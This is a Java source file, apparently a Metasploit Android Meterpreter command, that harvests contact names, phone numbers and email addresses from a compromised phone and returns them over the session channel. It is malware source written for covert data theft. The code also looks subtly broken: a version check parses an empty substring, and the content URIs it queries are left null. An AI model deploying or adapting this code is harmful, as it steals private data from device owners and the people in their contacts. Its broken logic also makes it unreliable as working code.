package com.metasploit.meterpreter.android;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
//import android.provider.ContactsContract;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

public class dump_contacts_android implements Command {

	private static final int TLV_EXTENSIONS = 20000;
	private static final int TLV_TYPE_CONTACT_GROUP = TLVPacket.TLV_META_TYPE_GROUP | (TLV_EXTENSIONS + 9007);
	private static final int TLV_TYPE_CONTACT_NUMBER = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 9008);
	private static final int TLV_TYPE_CONTACT_EMAIL = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 9009);
	private static final int TLV_TYPE_CONTACT_NAME = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 9010);
	
	@Override
	public int execute(Meterpreter meterpreter, TLVPacket request,
			TLVPacket response) throws Exception {

		ContentResolver cr = AndroidMeterpreter.getContext().getContentResolver();
		
		if (Integer.parseInt(Build.VERSION.RELEASE.substring(0, 0)) >= 2) {
			
			Uri PhoneUri = null, EmailUri = null, ContactUri = null;
			Cursor cur = cr.query(ContactUri, null, null, null, null);
			
			if (cur.getCount() > 0) {
				
				while (cur.moveToNext()) {
					
					TLVPacket pckt = new TLVPacket();
					
					String id = cur.getString(cur.getColumnIndex("_id"));
					
			        //String displayName = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME_PRIMARY));
	                pckt.addOverflow(TLV_TYPE_CONTACT_NAME, 
	                		cur.getString(cur.getColumnIndex("display_name")));
			        
	                
		            Cursor pCur = cr.query(PhoneUri, null,
		            		"contact_id" + " = ?", new String[] { id }, null);
		            
		            while (pCur.moveToNext()) {
		                //String number = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
		                //String typeStr = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
		                
		                pckt.addOverflow(TLV_TYPE_CONTACT_NUMBER,
		                		pCur.getString(pCur.getColumnIndex("data1")));
		            }            
		            pCur.close();
	
		            Cursor emailCur = cr.query(EmailUri, null,
		            		 "contact_id" + " = ?", new String[] { id }, null);
		            
	            	while (emailCur.moveToNext()) {
	            		//String email = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
	            		//String emailType = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
	            		
		                pckt.addOverflow(TLV_TYPE_CONTACT_EMAIL, 
		                		emailCur.getString(emailCur.getColumnIndex("data1")));	            		
	            	}	            	
	            	emailCur.close();
	            	
	            	response.addOverflow(TLV_TYPE_CONTACT_GROUP, pckt);
	
				}
			}
			
			cur.close();
		}

		return ERROR_SUCCESS;
	}

}
